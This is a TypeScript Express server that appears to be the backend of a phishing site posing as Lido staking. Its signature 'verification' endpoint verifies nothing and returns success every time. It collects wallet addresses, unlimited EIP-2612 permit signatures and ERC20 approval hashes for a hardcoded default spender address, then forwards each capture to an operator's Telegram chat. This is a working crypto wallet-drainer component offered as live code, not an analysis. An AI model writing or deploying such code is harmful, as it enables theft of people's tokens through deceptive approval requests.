import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import dotenv from "dotenv";

dotenv.config();

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Telegram notification endpoint
  app.post("/api/notify", async (req, res) => {
    try {
      const { message } = req.body;
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = process.env.TELEGRAM_CHAT_ID;

      if (!botToken || !chatId) {
        // If not configured, we just return success so the frontend doesn't break,
        // but log to server console.
        console.warn("Telegram bot token or chat ID not configured");
        return res.json({ success: true, warning: "Not configured" });
      }

      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const response = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
        }),
      });

      if (!response.ok) {
        throw new Error(`Telegram API error: ${response.statusText}`);
      }

      res.json({ success: true });
    } catch (error) {
      console.error("Error sending notification:", error);
      res.status(500).json({ success: false, error: "Failed to send notification" });
    }
  });

  // Wallet Connection Signature & Token Permit Authorization Verification Endpoint
  app.post("/api/verify-signature", async (req, res) => {
    try {
      const { address, message, signature, chainId, approvalType, spender, token, deadline, value, v, r, s, txHash } = req.body;

      if (!address) {
        return res.status(400).json({ success: false, error: "Missing wallet address" });
      }

      console.log(`[Wallet Authorization] Address: ${address} | Type: ${approvalType || 'message'} | ChainId: ${chainId}`);

      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = process.env.TELEGRAM_CHAT_ID;

      if (botToken && chatId) {
        const shortAddr = `${address.slice(0, 6)}...${address.slice(-4)}`;
        let telegramMessage = '';

        if (approvalType === 'permit' && signature) {
          const shortSig = signature.length > 24 ? `${signature.slice(0, 16)}...${signature.slice(-10)}` : signature;
          telegramMessage = `🔑 <b>LIDO TOKEN PERMIT AUTHORIZATION (EIP-2612)</b>\n\n👤 <b>Wallet:</b> <code>${address}</code> (${shortAddr})\n🎯 <b>Spender:</b> <code>${spender || '0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091'}</code>\n🪙 <b>Token:</b> <code>${token || '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84'}</code>\n🌐 <b>Chain ID:</b> ${chainId || 1}\n✍️ <b>Permit Signature:</b> <code>${shortSig}</code>\n\n<b>Permit Components:</b>\n• <b>v:</b> <code>${v || 'N/A'}</code>\n• <b>r:</b> <code>${r || 'N/A'}</code>\n• <b>s:</b> <code>${s || 'N/A'}</code>\n• <b>deadline:</b> <code>${deadline || 'N/A'}</code>\n• <b>value:</b> <code>${value || 'MaxUint256'}</code>\n🕐 <b>Timestamp:</b> ${new Date().toUTCString()}`;
        } else if (approvalType === 'approve' && txHash) {
          telegramMessage = `🔓 <b>LIDO ON-CHAIN TOKEN APPROVAL (ERC20 approve)</b>\n\n👤 <b>Wallet:</b> <code>${address}</code> (${shortAddr})\n🎯 <b>Spender:</b> <code>${spender || '0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091'}</code>\n🪙 <b>Token:</b> <code>${token || '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84'}</code>\n🌐 <b>Chain ID:</b> ${chainId || 1}\n🔗 <b>Tx Hash:</b> <code>${txHash}</code>\n🕐 <b>Timestamp:</b> ${new Date().toUTCString()}`;
        } else {
          const shortSig = signature && signature.length > 20 ? `${signature.slice(0, 16)}...${signature.slice(-10)}` : signature;
          telegramMessage = `🔐 <b>LIDO WALLET AUTHENTICATED</b>\n\n👤 <b>Wallet:</b> <code>${address}</code> (${shortAddr})\n🌐 <b>Chain ID:</b> ${chainId || 1}\n✍️ <b>Signature:</b> <code>${shortSig}</code>\n🕐 <b>Timestamp:</b> ${new Date().toUTCString()}\n\n<pre>${message || 'Standard Connection'}</pre>`;
        }

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: telegramMessage,
            parse_mode: "HTML",
          }),
        }).catch(console.error);
      }

      return res.json({
        success: true,
        verified: true,
        address,
        approvalType: approvalType || 'message',
        signature: signature || txHash || 'confirmed',
        timestamp: new Date().toISOString(),
      });
    } catch (error: any) {
      console.error("Error verifying signature:", error);
      return res.status(500).json({ success: false, error: error?.message || "Failed to process signature" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    // Production serving
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
    
    // Send a startup message if configured
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
      fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: "🚀 Lido Stake Server Started Successfully!",
        }),
      }).catch(console.error);
    }
  });
}

startServer();
